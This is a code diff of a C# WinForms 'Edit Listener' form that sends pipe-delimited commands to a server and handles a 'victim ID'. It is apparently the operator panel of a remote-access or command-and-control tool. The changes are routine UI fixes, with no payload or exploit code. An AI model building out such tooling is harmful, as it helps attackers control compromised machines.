@@ -27,6 +27,8 @@ namespace Eden
         public frmListenerEdit()
         {
             InitializeComponent();
+
+            Text = "Edit Listener";
         }
 
         void Received(clsClient clnt, string szVictimID, List<string> aMsg)
@@ -45,8 +47,20 @@ namespace Eden
                                 foreach (string szTemplate in lsTemplate)
                                     comboBox1.Items.Add(szTemplate);
 
-                                if (comboBox1.Items.Count > 0)
+                                if (comboBox1.Items.Count > 0 && string.IsNullOrEmpty(comboBox1.Text))
                                     comboBox1.SelectedIndex = 0;
+                                
+                                if (m_bEdit)
+                                {
+                                    for (int i = 0; i < comboBox1.Items.Count; i++)
+                                    {
+                                        if (string.Equals(comboBox1.Items[i], m_stListener.szTemplate))
+                                        {
+                                            comboBox1.SelectedIndex = i;
+                                            break;
+                                        }
+                                    }
+                                }
                             }));
                         }
                     }
@@ -56,7 +70,7 @@ namespace Eden
                         if (nCode == 1)
                         {
                             MessageBox.Show("Add listener successfully.", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
-                            Close();
+                            Invoke(Close);
                         }
                         else
                         {
@@ -69,30 +83,18 @@ namespace Eden
                         if (nCode == 1)
                         {
                             MessageBox.Show("Edit listener successfully.", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
-                            Close();
+                            Invoke(Close);
                         }
                         else
                         {
                             MessageBox.Show("Edit listener failed.", "Failed", MessageBoxButtons.OK, MessageBoxIcon.Error);
                         }
                     }
-                    else if (aMsg[1] == "del")
-                    {
-                        int nCode = int.Parse(aMsg[2]);
-                        if (nCode == 1)
-                        {
-                            MessageBox.Show("Delete listener successfully.", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
-                        }
-                        else
-                        {
-                            MessageBox.Show("Delete listener failed.", "Failed", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                        }
-                    }
                 }
             }
             catch (Exception ex)
             {
-
+                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
             }
         }
 
@@ -100,16 +102,16 @@ namespace Eden
         {
             m_clnt.ServerMessageReceived += Received;
 
+            comboBox1.DropDownStyle = ComboBoxStyle.DropDownList;
+
             if (m_bEdit)
             {
                 textBox1.Text = m_stListener.szName;
                 comboBox1.Text = m_stListener.szTemplate;
                 numericUpDown1.Value = m_stListener.nPort;
             }
-            else
-            {
-                m_clnt.SendCommand("listener|list|temp");
-            }
+
+            m_clnt.SendCommand("listener|list|temp");
         }
 
         private void frmListenerEdit_Load(object sender, EventArgs e)
@@ -139,6 +141,11 @@ namespace Eden
                 }));
             else
                 m_clnt.SendCommand($"listener|add|{comboBox1.Text}|{EZCrypto.Encoder.stre2b64(textBox1.Text)}|{numericUpDown1.Value}");
+        }
+
+        private void frmListenerEdit_FormClosed(object sender, FormClosedEventArgs e)
+        {
+            m_clnt.ServerMessageReceived -= Received;
         }
     }
 }
